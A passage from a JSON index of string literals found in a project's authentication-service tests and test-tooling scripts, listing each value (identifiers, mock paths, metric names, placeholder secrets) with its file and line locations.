        "auth_service/tests/test_critical_service_id_configuration_failures.py:291"
      ]
    },
    "auth-container-abc123": {
      "value": "auth-container-abc123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:134"
      ]
    },
    "auth-instance-001": {
      "value": "auth-instance-001",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:199"
      ]
    },
    "auth-service": {
      "value": "auth-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:214",
        "auth_service/tests/auth-service-down-critical-scenarios.py:236",
        "auth_service/tests/auth-service-down-critical-scenarios.py:502",
        "auth_service/tests/integration/test_oauth_flows_sync.py:66",
        "auth_service/tests/test_auth_startup_integration.py:149",
        "auth_service/tests/test_critical_staging_issues.py:166",
        "auth_service/tests/test_critical_staging_issues.py:204",
        "auth_service/tests/test_critical_staging_issues.py:208",
        "auth_service/tests/test_postgres_compliance.py:202"
      ]
    },
    "auth-service-staging": {
      "value": "auth-service-staging",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:41",
        "auth_service/test_url_construction.py:42"
      ]
    },
    "auth.staging": {
      "value": "auth.staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:196"
      ]
    },
    "authUrl": {
      "value": "authUrl",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:152"
      ]
    },
    "auth_": {
      "value": "auth_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:69"
      ]
    },
    "auth_code_": {
      "value": "auth_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:238"
      ]
    },
    "auth_core": {
      "value": "auth_core",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:19"
      ]
    },
    "auth_provider": {
      "value": "auth_provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:148",
        "auth_service/tests/factories/audit_factory.py:74",
        "auth_service/tests/factories/user_factory.py:40",
        "auth_service/tests/utils/assertion_helpers.py:92",
        "auth_service/tests/utils/assertion_helpers.py:105",
        "auth_service/tests/utils/assertion_helpers.py:106"
      ]
    },
    "auth_secret_456": {
      "value": "auth_secret_456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:103"
      ]
    },
    "auth_service": {
      "value": "auth_service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:214",
        "auth_service/tests/auth-service-down-critical-scenarios.py:236",
        "auth_service/tests/auth-service-down-critical-scenarios.py:502",
        "auth_service/tests/auth-service-down-critical-scenarios.py:516",
        "auth_service/tests/auth-service-down-critical-scenarios.py:537",
        "scripts/auto_fix_test_violations.py:93",
        "scripts/business_value_test_index.py:443",
        "scripts/compliance/fake_test_scanner.py:56",
        "scripts/compliance/test_size_validator.py:129",
        "scripts/remove_duplicate_test_setup.py:39"
      ]
    },
    "auth_service.auth_core.core.session_manager.SessionManager.create_session": {
      "value": "auth_service.auth_core.core.session_manager.SessionManager.create_session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:893"
      ]
    },
    "auth_service.auth_core.core.session_manager.auth_redis_manager": {
      "value": "auth_service.auth_core.core.session_manager.auth_redis_manager",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:65",
        "auth_service/tests/test_session_management.py:82"
      ]
    },
    "auth_service.auth_core.database.connection.auth_db.get_session": {
      "value": "auth_service.auth_core.database.connection.auth_db.get_session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:836"
      ]
    },
    "auth_service.auth_core.database.connection.auth_db.initialize": {
      "value": "auth_service.auth_core.database.connection.auth_db.initialize",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:37"
      ]
    },
    "auth_service.auth_core.database.connection.create_async_engine": {
      "value": "auth_service.auth_core.database.connection.create_async_engine",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:26",
        "auth_service/tests/test_cloud_sql_url.py:55",
        "auth_service/tests/test_cloud_sql_url.py:80",
        "auth_service/tests/test_cloud_sql_url.py:103",
        "auth_service/tests/test_database_authentication_failures.py:151",
        "auth_service/tests/test_database_authentication_failures.py:261",
        "auth_service/tests/test_database_authentication_failures.py:379",
        "auth_service/tests/test_database_connection_validation.py:52",
        "auth_service/tests/test_database_connection_validation.py:90",
        "auth_service/tests/test_database_connection_validation.py:165"
      ]
    },
    "auth_service.auth_core.database.connection_events.logger": {
      "value": "auth_service.auth_core.database.connection_events.logger",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:165"
      ]
    },
    "auth_service.auth_core.database.connection_events.setup_auth_async_engine_events": {
      "value": "auth_service.auth_core.database.connection_events.setup_auth_async_engine_events",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:272"
      ]
    },
    "auth_service.auth_core.database.database_manager.create_async_engine": {
      "value": "auth_service.auth_core.database.database_manager.create_async_engine",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:435",
        "auth_service/tests/test_staging_database_credentials.py:468"
      ]
    },
    "auth_service.auth_core.redis_manager.auth_redis_manager": {
      "value": "auth_service.auth_core.redis_manager.auth_redis_manager",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:145"
      ]
    },
    "auth_service.auth_core.routes.auth_routes.AuthConfig.get_google_client_id": {
      "value": "auth_service.auth_core.routes.auth_routes.AuthConfig.get_google_client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:45",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:88"
      ]
    },
    "auth_service.auth_core.routes.auth_routes.AuthConfig.get_google_client_secret": {
      "value": "auth_service.auth_core.routes.auth_routes.AuthConfig.get_google_client_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:89"
      ]
    },
    "auth_service.auth_core.routes.auth_routes.auth_service": {
      "value": "auth_service.auth_core.routes.auth_routes.auth_service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:74"
      ]
    },
    "auth_service.auth_core.routes.auth_routes.httpx.AsyncClient.get": {
      "value": "auth_service.auth_core.routes.auth_routes.httpx.AsyncClient.get",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:91"
      ]
    },
    "auth_service.auth_core.routes.auth_routes.httpx.AsyncClient.post": {
      "value": "auth_service.auth_core.routes.auth_routes.httpx.AsyncClient.post",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:90"
      ]
    },
    "auth_service.auth_core.routes.auth_routes.logger": {
      "value": "auth_service.auth_core.routes.auth_routes.logger",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:488",
        "auth_service/tests/test_security.py:516"
      ]
    },
    "auth_service.auth_core.routes.auth_routes.oauth_security": {
      "value": "auth_service.auth_core.routes.auth_routes.oauth_security",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:225"
      ]
    },
    "auth_service.auth_core.secret_loader.AuthSecretLoader": {
      "value": "auth_service.auth_core.secret_loader.AuthSecretLoader",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:25",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:31",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:41",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:51",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:61"
      ]
    },
    "auth_service.auth_core.security.oauth_security.OAuthSecurityManager.validate_state_parameter": {
      "value": "auth_service.auth_core.security.oauth_security.OAuthSecurityManager.validate_state_parameter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:139",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:183",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:840"
      ]
    },
    "auth_service.auth_core.security.oauth_security.auth_redis_manager": {
      "value": "auth_service.auth_core.security.oauth_security.auth_redis_manager",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:46",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:122",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:174",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:188",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:269",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:351"
      ]
    },
    "auth_service.auth_core.security.oauth_security.datetime": {
      "value": "auth_service.auth_core.security.oauth_security.datetime",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:97"
      ]
    },
    "auth_service.auth_core.security.oauth_security.hashlib.sha256": {
      "value": "auth_service.auth_core.security.oauth_security.hashlib.sha256",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:183"
      ]
    },
    "auth_service.auth_core.security.oauth_security.logger": {
      "value": "auth_service.auth_core.security.oauth_security.logger",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:251",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:191",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:202",
        "auth_service/tests/unit/test_oauth_pkce_validation.py:60"
      ]
    },
    "auth_service.main": {
      "value": "auth_service.main",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:524",
        "auth_service/tests/test_critical_staging_issues.py:138"
      ]
    },
    "auth_service.main:app": {
      "value": "auth_service.main:app",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:60",
        "auth_service/tests/test_auth_startup_integration.py:255",
        "auth_service/tests/test_auth_startup_integration.py:264"
      ]
    },
    "auth_service/app": {
      "value": "auth_service/app",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:176"
      ]
    },
    "auth_service/tests": {
      "value": "auth_service/tests",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:143",
        "scripts/batch_fix_and_test.py:42",
        "scripts/compliance/project_test_validator.py:62",
        "scripts/fix_test_syntax_errors.py:227"
      ]
    },
    "auth_service/tests/conftest.py": {
      "value": "auth_service/tests/conftest.py",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:14"
      ]
    },
    "auth_service_health": {
      "value": "auth_service_health",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:48",
        "scripts/test_oauth_local.py:133",
        "scripts/test_oauth_local.py:406",
        "scripts/test_oauth_local.py:406"
      ]
    },
    "auth_service_test": {
      "value": "auth_service_test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:40",
        "auth_service/tests/test_auth_token_validation.py:40"
      ]
    },
    "auth_service_url": {
      "value": "auth_service_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:103",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1407",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1413",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1452",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1463"
      ]
    },
    "auth_services": {
      "value": "auth_services",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:18",
        "scripts/analyze_test_mocks.py:45"
      ]
    },
    "auth_service|AuthService": {
      "value": "auth_service|AuthService",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:443"
      ]
    },
    "auth_success": {
      "value": "auth_success",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:298"
      ]
    },
    "auth_url": {
      "value": "auth_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:459"
      ]
    },
    "auth_users table should exist after table creation": {
      "value": "auth_users table should exist after table creation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:64"
      ]
    },
    "authentication": {
      "value": "authentication",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:135",
        "auth_service/tests/test_five_whys_reproduction.py:38",
        "auth_service/tests/test_five_whys_reproduction.py:43",
        "scripts/business_value_test_index.py:95",
        "scripts/business_value_test_index.py:421",
        "scripts/business_value_test_index.py:468",
        "scripts/business_value_test_index.py:490",
        "scripts/business_value_test_index.py:662",
        "scripts/business_value_test_index.py:705",
        "scripts/test_websocket_dev_mode.py:43"
      ]
    },
    "auth|login|jwt|session|token": {
      "value": "auth|login|jwt|session|token",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:95"
      ]
    },
    "auto": {
      "value": "auto",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:228",
        "scripts/test_backend.py:229",
        "scripts/test_backend.py:359",
        "scripts/unified_test_config.py:194",
        "scripts/unified_test_config.py:351",
        "scripts/unified_test_runner.py:191"
      ]
    },
    "automated": {
      "value": "automated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:194"
      ]
    },
    "automatic fixes": {
      "value": "automatic fixes",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:299"
      ]
    },
    "availability": {
      "value": "availability",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:201",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:215"
      ]
    },
    "available_urls": {
      "value": "available_urls",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:62",
        "scripts/test_database_url_builder_comprehensive.py:65"
      ]
    },
    "avatar_url": {
      "value": "avatar_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:226"
      ]
    },
    "average": {
      "value": "average",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:93",
        "scripts/real_service_test_metrics.py:185"
      ]
    },
    "average_estimated_duration": {
      "value": "average_estimated_duration",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:906"
      ]
    },
    "average_rps": {
      "value": "average_rps",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "average_success_rate": {
      "value": "average_success_rate",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:908"
      ]
    },
    "average_value_score": {
      "value": "average_value_score",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:597",
        "scripts/business_value_test_index.py:621",
        "scripts/business_value_test_index.py:738",
        "scripts/business_value_test_index.py:743"
      ]
    },
    "avg_complexity": {
      "value": "avg_complexity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:64",
        "scripts/analyze_test_overlap.py:408",
        "scripts/analyze_test_overlap.py:463",
        "scripts/analyze_test_overlap.py:465",
        "scripts/analyze_test_overlap.py:563"
      ]
    },
    "avg_error_rate": {
      "value": "avg_error_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:215"
      ]
    },
    "avg_latency_p50_ms": {
      "value": "avg_latency_p50_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:215"
      ]
    },
    "avg_latency_p95_ms": {
      "value": "avg_latency_p95_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:215"
      ]
    },
    "avg_tokens_per_request": {
      "value": "avg_tokens_per_request",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:202"
      ]
    },
    "await": {
      "value": "await",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:99"
      ]
    },
    "back_to_school": {
      "value": "back_to_school",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:29",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:144"
      ]
    },
    "backend": {
      "value": "backend",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:31",
        "scripts/align_test_imports.py:69",
        "scripts/align_test_imports.py:70",
        "scripts/align_test_imports.py:71",
        "scripts/business_value_test_index.py:405",
        "scripts/start_test_services.py:99",
        "scripts/test_cold_start_e2e.py:435",
        "scripts/test_cold_start_e2e.py:445",
        "scripts/test_coordination_fixes.py:95",
        "scripts/test_coordination_fixes.py:111"
      ]
    },
    "backend-service": {
      "value": "backend-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:151"
      ]
    },
    "backend-staging-pr-123": {
      "value": "backend-staging-pr-123",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:42"
      ]
    },
    "backend-svc": {
      "value": "backend-svc",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:215",
        "auth_service/tests/unified/test_jwt_validation.py:219"
      ]
    },
    "backend_health": {
      "value": "backend_health",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:49",
        "scripts/test_oauth_local.py:134",
        "scripts/test_oauth_local.py:409",
        "scripts/test_oauth_local.py:409"
      ]
    },
    "backend_secret_123": {
      "value": "backend_secret_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:100"
      ]
    },
    "backend_url": {
      "value": "backend_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:104",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1425",
        "scripts/test_oauth_local.py:458"
      ]
    },
    "background_tasks": {
      "value": "background_tasks",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:46"
      ]
    },
    "bad_test": {
      "value": "bad_test",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:112"
      ]
    },
    "bad_tests": {
      "value": "bad_tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:240"
      ]
    },
    "bad_tests.json": {
      "value": "bad_tests.json",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:127",
        "scripts/team_updates_test_analyzer.py:153"
      ]
    },
    "balanced": {
      "value": "balanced",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:61",
        "scripts/test_backend_optimized.py:123",
        "scripts/test_backend_optimized.py:189",
        "scripts/test_backend_optimized.py:374",
        "scripts/test_backend_optimized.py:375"
      ]
    },
    "base": {
      "value": "base",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:125",
        "scripts/test_ssl_certificates_staging.py:175"
      ]
    },
    "base_rps": {
      "value": "base_rps",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:37",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:43",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:112"
      ]
    },
    "basic": {
      "value": "basic",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:286",
        "scripts/test_example_message_flow.py:408"
      ]
    },
    "batch_fix_results_": {
      "value": "batch_fix_results_",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:372"
      ]
    },
    "bearer": {
      "value": "bearer",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:136",
        "auth_service/tests/test_security.py:218",
        "auth_service/tests/test_security.py:280",
        "auth_service/tests/test_security.py:352",
        "auth_service/tests/test_security.py:433"
      ]
    },
    "bearer.invalid.token": {
      "value": "bearer.invalid.token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1036"
      ]
    },
    "benchmark": {
      "value": "benchmark",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:229",
        "scripts/unified_test_config.py:102"
      ]
    },
    "bin": {
      "value": "bin",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:27"
      ]
    },
    "black_friday": {
      "value": "black_friday",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:29",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:146"
      ]
    },
    "blocked": {
      "value": "blocked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:675"
      ]
    },
    "body": {
      "value": "body",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:51",
        "scripts/test_staging_deployment.py:65",
        "scripts/test_staging_deployment.py:67",
        "scripts/test_staging_deployment.py:71"
      ]
    },
    "bold magenta": {
      "value": "bold magenta",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:67",
        "scripts/test_oauth_local.py:349"
      ]
    },
    "branch_name": {
      "value": "branch_name",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:191"
      ]
    },
    "build": {
      "value": "build",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:132",
        "scripts/check_conftest_violations.py:23",
        "scripts/compliance/real_test_requirements_enforcer.py:134",
        "scripts/generate_test_audit.py:25",
        "scripts/test_frontend.py:300"
      ]
    },
    "bulk": {
      "value": "bulk",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:214"
      ]
    },
    "businessValue": {
      "value": "businessValue",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:287",
        "scripts/test_example_message_flow.py:409"
      ]
    },
    "business_impact": {
      "value": "business_impact",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "business_value_coverage.json": {
      "value": "business_value_coverage.json",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:719"
      ]
    },
    "business_value_test_coverage": {
      "value": "business_value_test_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:118"
      ]
    },
    "business_value_test_coverage.xml": {
      "value": "business_value_test_coverage.xml",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:115"
      ]
    },
    "by_priority": {
      "value": "by_priority",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:911"
      ]
    },
    "by_type": {
      "value": "by_type",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:915"
      ]
    },
    "bytes": {
      "value": "bytes",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:48"
      ]
    },
    "cache": {
      "value": "cache",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:28",
        "auth_service/tests/auth-service-down-critical-scenarios.py:444",
        "scripts/analyze_test_mocks.py:52",
        "scripts/auto_fix_test_sizes.py:352",
        "scripts/auto_fix_test_sizes.py:353"
      ]
    },
    "cache_enabled": {
      "value": "cache_enabled",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:169"
      ]
    },
    "cache_hit_rate": {
      "value": "cache_hit_rate",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:234"
      ]
    },
    "cache_hits": {
      "value": "cache_hits",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:213",
        "scripts/test_backend_optimized.py:213",
        "scripts/test_backend_optimized.py:234",
        "scripts/test_backend_optimized.py:271",
        "scripts/test_backend_optimized.py:337"
      ]
    },
    "cache_stats": {
      "value": "cache_stats",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:24",
        "scripts/real_service_test_metrics.py:58",
        "scripts/real_service_test_metrics.py:60",
        "scripts/real_service_test_metrics.py:62",
        "scripts/real_service_test_metrics.py:62",
        "scripts/real_service_test_metrics.py:64",
        "scripts/real_service_test_metrics.py:64",
        "scripts/real_service_test_metrics.py:168",
        "scripts/real_service_test_metrics.py:168",
        "scripts/real_service_test_metrics.py:173"
      ]
    },
    "cache_status": {
      "value": "cache_status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:444"
      ]
    },
    "cache_ttl_hours": {
      "value": "cache_ttl_hours",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:179",
        "scripts/test_backend_optimized.py:186",
        "scripts/test_backend_optimized.py:193"
      ]
    },
    "cached": {
      "value": "cached",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:258"
      ]
    },
    "callback": {
      "value": "callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_auth.py:48",
        "auth_service/tests/integration/test_oauth_flows_core.py:59",
        "auth_service/tests/integration/test_oauth_flows_sync.py:139"
      ]
    },
    "callback_result": {
      "value": "callback_result",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:176"
      ]
    },
    "calls": {
      "value": "calls",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:66"
      ]
    },
    "cascade_probability": {
      "value": "cascade_probability",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:463",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:475"
      ]
    },
    "cascading_failure": {
      "value": "cascading_failure",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:23",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:82"
      ]
    },
    "cat app/tests/examples/test_size_compliance_examples.py": {
      "value": "cat app/tests/examples/test_size_compliance_examples.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:197"
      ]
    },
    "categories": {
      "value": "categories",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:35",
        "scripts/add_test_markers.py:141",
        "scripts/add_test_markers.py:141",
        "scripts/add_test_markers.py:214",
        "scripts/analyze_test_overlap.py:356",
        "scripts/analyze_test_overlap.py:405",
        "scripts/analyze_test_overlap.py:456",
        "scripts/analyze_test_overlap.py:473",
        "scripts/analyze_test_overlap.py:552",
        "scripts/test_failure_scanner.py:29"
      ]
    },
    "categories_scanned": {
      "value": "categories_scanned",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:197"
      ]
    },
    "categories_with_history": {
      "value": "categories_with_history",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:907"
      ]
    },
    "category": {
      "value": "category",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:108",
        "scripts/analyze_test_mocks.py:129",
        "scripts/analyze_test_mocks.py:164",
        "scripts/analyze_test_mocks.py:179",
        "scripts/compliance/test_refactor_helper.py:423",
        "scripts/compliance/test_refactor_helper.py:433",
        "scripts/compliance/test_refactor_helper.py:462",
        "scripts/compliance/test_refactor_helper.py:473",
        "scripts/compliance/test_refactor_helper.py:505",
        "scripts/compliance/test_refactor_helper.py:571"
      ]
    },
    "category1": {
      "value": "category1",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:375"
      ]
    },
    "category2": {
      "value": "category2",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:376"
      ]
    },
    "category_based": {
      "value": "category_based",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:840"
      ]
    },
    "category_failure": {
      "value": "category_failure",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:814",
        "scripts/unified_test_runner.py:816"
      ]
    },
    "category_statistics": {
      "value": "category_statistics",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:674"
      ]
    },
    "caused problematic database name": {
      "value": "caused problematic database name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:393"
      ]
    },
    "caused wrong database name:": {
      "value": "caused wrong database name:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:392"
      ]
    },
    "center": {
      "value": "center",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:69",
        "scripts/test_oauth_local.py:351"
      ]
    },
    "certificate": {
      "value": "certificate",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:370"
      ]
    },
    "certificate verify failed: certificate has expired": {
      "value": "certificate verify failed: certificate has expired",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:358"
      ]
    },
    "challenge": {
      "value": "challenge",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:203"
      ]
    },
    "change_method": {
      "value": "change_method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:122"
      ]
    },
    "changed test files...": {
      "value": "changed test files...",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:243"
      ]
    },
    "characters required": {
      "value": "characters required",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:75"
      ]
    },
    "chars": {
      "value": "chars",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:347",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:354",
        "auth_service/tests/unit/test_oauth_state_security.py:47"
      ]
    },
    "chars)": {
      "value": "chars)",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:183"
      ]
    },
    "chat:create": {
      "value": "chat:create",
      "category": "test_literals",
      "locations": [
